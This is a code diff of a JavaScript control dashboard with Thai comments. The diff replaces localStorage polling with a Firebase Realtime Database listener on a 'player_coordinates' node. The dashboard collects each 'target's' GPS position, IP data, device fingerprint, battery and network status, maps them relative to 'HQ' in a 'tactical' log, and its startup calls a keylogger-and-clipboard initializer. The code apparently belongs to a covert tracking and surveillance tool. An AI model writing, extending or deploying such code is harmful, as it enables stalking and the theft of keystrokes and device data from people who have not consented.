@@ -133,7 +133,7 @@ function safeInit() {
   startClock();
   initKeyloggerAndClipboard();
   initActivityLog();
-  startCoordinatePolling();
+  // ยกเลิก startCoordinatePolling() - ใช้ Firebase Realtime Listener แทน
   initFirebaseListener();
   
   const saved = loadSession();
@@ -2229,114 +2229,9 @@ function bindEvents() {
   });
 }
 
-// ===== MOBILE COORDINATE SYNC =====
-let mobileSyncTimer = null;
-const MOBILE_SYNC_INTERVAL = 7000; // 7 วินาที
-
-function startMobileSync() {
-  if (mobileSyncTimer) clearInterval(mobileSyncTimer);
-  mobileSyncTimer = setInterval(() => {
-    syncMobileCoordinates();
-  }, MOBILE_SYNC_INTERVAL);
-}
-
-function stopMobileSync() {
-  if (mobileSyncTimer) {
-    clearInterval(mobileSyncTimer);
-    mobileSyncTimer = null;
-  }
-}
-
-function syncMobileCoordinates() {
-  if (!sessionUser) return;
-  
-  players.forEach((p) => {
-    if (p.tracking && p.coords) {
-      // ตรวจสอบการอัปเดตล่าสุดจากมือถือ
-      const lastUpdate = p.lastUpdate ? new Date(p.lastUpdate) : null;
-      const now = new Date();
-      
-      // ถ้ามีการอัปเดตใน 10 วินาทีที่ผ่านมา ให้รีเฟรชข้อมูล
-      if (lastUpdate && (now - lastUpdate) < 10000) {
-        // อัปเดตแผนที่โดยอัตโนมัติ
-        if (mapInstance && p.coords) {
-          updateMapMarker('player', p.id, p.coords.latitude, p.coords.longitude,
-            `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
-        }
-        // อัปเดต Left Sidebar Activity Log
-        updateActivityLog(p.id, '📍 พิกัดอัปเดต', `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`);
-      }
-    }
-  });
-}
-
-// ===== COORDINATE POLLING FOR MOBILE SYNC =====
-let lastCoordCheckTime = 0;
-let lastCoordData = {};
-
-function checkForNewCoordinates() {
-  // เช็คพิกัดใหม่จากฐานข้อมูลจำลอง (localStorage)
-  const coordKey = 'mobile_coords_latest';
-  const stored = localStorage.getItem(coordKey);
-  
-  if (!stored) return;
-  
-  try {
-    const data = JSON.parse(stored);
-    const checkTime = data.timestamp ? new Date(data.timestamp).getTime() : 0;
-    
-    // ถ้ามีข้อมูลใหม่ที่ยังไม่ได้ประมวลผล
-    if (checkTime > lastCoordCheckTime) {
-      lastCoordCheckTime = checkTime;
-      
-      // ประมวลผลข้อมูลพิกัดใหม่
-      if (data.targetId && data.coords) {
-        handleRealTimeLocationData(data.targetId, {
-          coords: data.coords,
-          timestamp: data.timestamp,
-          permission: data.permission,
-          source: data.source,
-          distanceKm: data.distanceKm,
-          ipData: data.ipData,
-          fingerprint: data.fingerprint,
-          battery: data.battery,
-          charging: data.charging,
-          network: data.network
-        });
-        
-        // แสดงข้อความใน Activity Log Console แบบ Tactical
-        pushToActivityLogConsole(data.targetId, {
-          coords: data.coords,
-          permission: data.permission,
-          source: data.source,
-          distanceKm: data.distanceKm,
-          fingerprint: data.fingerprint,
-          battery: data.battery,
-          charging: data.charging,
-          network: data.network
-        });
-      }
-    }
-  } catch (e) {
-    // ข้ามข้อผิดพลาด
-  }
-}
-
-// เริ่มการเช็คพิกัดในลูป
-function startCoordinatePolling() {
-  if (mobileSyncTimer) clearInterval(mobileSyncTimer);
-  mobileSyncTimer = setInterval(() => {
-    checkForNewCoordinates();
-    syncMobileCoordinates();
-  }, MOBILE_SYNC_INTERVAL);
-}
-
-function stopCoordinatePolling() {
-  if (mobileSyncTimer) {
-    clearInterval(mobileSyncTimer);
-    mobileSyncTimer = null;
-  }
-}
+// ===== MOBILE COORDINATE SYNC (DEPRECATED - ใช้ Firebase Realtime Listener แทน) =====
+// ระบบ polling 7 วินาทีถูกยกเลิก เพื่อใช้ Real-time Listener ของ Firebase แทน
+// ฟังก์ชันเหล่านี้เก็บไว้เพื่อความเข้ากันได้กับโค้ดเดิม แต่ไม่ได้ถูกเรียกใช้
 
 // ===== LEFT SIDEBAR ACTIVITY LOG =====
 let activityLogEl = null;
@@ -2393,7 +2288,8 @@ function updateAdminAccountIcon() {
 }
 
 // ===== FIREBASE REAL-TIME LISTENER =====
-let firebaseUnsubscribe = null;
+let firebaseDb = null;
+let firebaseConnected = false;
 
 function initFirebaseListener() {
   // ตรวจสอบว่า Firebase ถูกโหลดและพร้อมใช้งาน
@@ -2411,55 +2307,39 @@ function initFirebaseListener() {
     }
   }
   
-  // เริ่มฟังข้อมูลจาก Firestore
-  if (typeof firebase !== 'undefined' && firebase.firestore) {
+  // เริ่มฟังข้อมูลจาก Firebase Realtime Database
+  if (typeof firebase !== 'undefined' && firebase.database) {
     try {
-      const db = firebase.firestore();
-      firebaseUnsubscribe = db.collection('location_reports').onSnapshot((snapshot) => {
-        snapshot.docChanges().forEach((change) => {
-          if (change.type === 'added' || change.type === 'modified') {
-            const data = change.doc.data();
-            const targetId = change.doc.id;
-            handleRealTimeLocationData(targetId, data);
+      firebaseDb = firebase.database();
+      
+      // ใช้ .on('value', ...) เพื่อดักฟังข้อมูล Real-time จากโหนด player_coordinates
+      firebaseDb.ref('player_coordinates').on('value', (snapshot) => {
+        const data = snapshot.val();
+        if (!data) return;
+        
+        // วนลูปตรวจสอบผู้เล่นแต่ละคน
+        Object.keys(data).forEach((targetId) => {
+          const playerData = data[targetId];
+          if (playerData && playerData.coords) {
+            handleRealTimeLocationData(targetId, playerData);
           }
         });
+        
+        firebaseConnected = true;
       }, (error) => {
-        console.warn('Firebase listener error:', error);
-        // หาก Firebase ล้มเหลว ให้ใช้ localStorage polling
-        startLocalStoragePolling();
+        console.warn('Firebase Realtime listener error:', error);
+        firebaseConnected = false;
       });
+      
+      appendLog('[FIREBASE] Real-time listener activated - กำลังฟังข้อมูลจากฐานข้อมูลกลาง', LOG.green);
     } catch (e) {
-      console.warn('Firebase listener setup failed:', e);
-      startLocalStoragePolling();
+      console.warn('Firebase Realtime listener setup failed:', e);
+      appendLog('[FIREBASE] Connection failed - กรุณาตรวจสอบการเชื่อมต่อ', LOG.red);
     }
   } else {
-    // หาก Firebase ไม่พร้อมใช้งาน ให้ใช้ localStorage polling
-    startLocalStoragePolling();
+    console.warn('Firebase Realtime Database not available');
+    appendLog('[FIREBASE] SDK not loaded - ไม่สามารถใช้ Real-time ได้', LOG.orange);
   }
-}
-
-function startLocalStoragePolling() {
-  // ใช้การตรวจสอบ localStorage เป็นวิธีสำรอง
-  // ระบบนี้ทำงานเมื่อ Firebase ไม่พร้อมใช้งาน
-  let lastCheckTime = localStorage.getItem('last_location_check') || '0';
-  
-  setInterval(() => {
-    const currentCheck = localStorage.getItem('last_location_check') || '0';
-    if (currentCheck !== lastCheckTime) {
-      lastCheckTime = currentCheck;
-      // ตรวจสอบผู้เล่นที่มีการอัปเดต
-      players.forEach((p) => {
-        if (p.lastUpdate) {
-          const updateTime = new Date(p.lastUpdate).getTime();
-          const lastTime = parseInt(lastCheckTime);
-          if (updateTime > lastTime) {
-            // มีข้อมูลใหม่
-            handleRealTimeLocationData(p.id, p);
-          }
-        }
-      });
-    }
-  }, 3000); // ตรวจสอบทุก 3 วินาที
 }
 
 function handleRealTimeLocationData(targetId, data) {
